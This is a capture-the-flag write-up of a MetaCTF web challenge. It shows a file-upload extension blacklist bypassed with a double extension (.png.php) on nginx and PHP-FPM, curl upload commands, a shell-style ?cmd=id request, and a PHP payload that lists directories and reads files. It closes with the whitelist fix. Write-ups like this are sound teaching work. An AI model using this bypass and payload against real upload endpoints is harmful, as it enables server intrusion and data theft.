---
title: 'Web: BrandKit Studio'
description: 'Double extension upload bypass on nginx + PHP-FPM to get arbitrary file read.'
pubDate: '2026-03-26'
author: 'riverxia'
---

# The Challenge

**BrandKit Studio** from MetaCTF. A branding toolkit web app — upload a logo, customize colors and text, preview social media assets (LinkedIn banner, avatar, square post), and download them as a ZIP. Standard PHP app behind nginx.

The upload accepts "image files" and saves them to `/uploads/<session_hash>/<filename>`. There's an `asset.php?type=banner|avatar|square` endpoint that generates preview images, an `update-kit.php` for customizing text/colors, and `download-kit.php` that ZIPs the generated assets.

## Recon

First thing: upload a legit PNG, poke around. The app saves your file with the **original filename** — not forced to `logo.png`. Confirmed by uploading as `totally_different_name.jpg`:

```
uploads/e37d8630a48d87454861d5b1eda35cec/totally_different_name.jpg
```

This is interesting. If the server keeps whatever filename you give it, maybe we can upload a `.php` file.

Trying `shell.php` → blocked. `.phtml`, `.phar`, `.php5`, `.pht` → all blocked. The server has a blacklist on PHP extensions. Case variations (`PhP`, `PHP`) → also blocked.

Checking response headers: `nginx/1.29.6`. PHP runs behind nginx via PHP-FPM.

## The Bypass: Double Extension

The blacklist catches `.php` as an extension but doesn't catch `.png.php` — a double extension where `.php` is the final part:

```bash
curl -X POST http://target/upload.php \
  -F "logo=@shell.png.php;filename=logo.png.php;type=image/png"
```

Response:
```
uploads/eb2147904c0856c967a2d2afa62559b7/logo.png.php
```

It uploaded! The server's extension check probably does something like `pathinfo($name, PATHINFO_EXTENSION)` which returns `php` — wait, that should have blocked it. More likely it checks the first extension or uses a regex that doesn't account for double dots.

## Does It Execute?

Accessing the uploaded file:

```bash
curl -sv "http://target/uploads/.../logo.png.php?cmd=id"
```

```
< Content-Type: text/html; charset=UTF-8
```

**`text/html`**, not `image/png`. Nginx matched the `.php` extension in its `location ~ \.php$` block and passed it to PHP-FPM. The file is being executed as PHP.

But the output was just the PNG header bytes (`\x89PNG\r\n\x1a\n`) — the PHP code didn't produce output. Turns out command execution functions are disabled:

```
disable_functions: exec,passthru,shell_exec,system,proc_open,popen
```

## File Read Instead

No command execution, but `file_get_contents()` works fine. Upload a PHP file that reads the filesystem:

```php
<?php
echo implode(', ', scandir('/'));
echo file_get_contents('/flag-33ebe70a06a4017da2c4a910cf2aa95f.txt');
?>
```

(Prepend PNG magic bytes `\x89PNG\r\n\x1a\n` so the upload's image check passes.)

```bash
# Upload
curl -X POST http://target/upload.php \
  -F "logo=@payload.png.php;filename=f.png.php;type=image/png"

# Read
curl "http://target/uploads/.../f.png.php"
```

```
MetaCTF{ju5t_a_b17_0f_f1l3_3x3cut10n_a5_a_tr3at}
```

## Summary

1. Upload preserves original filenames
2. Extension blacklist doesn't catch `.png.php` (double extension)
3. Nginx passes `*.php` to PHP-FPM regardless of what comes before
4. Command execution disabled, but `file_get_contents()` reads the flag
5. `scandir('/')` reveals the randomized flag filename

The fix: whitelist allowed extensions instead of blacklisting PHP ones. Or better — rename all uploads to a random hash and never let users control the filename.
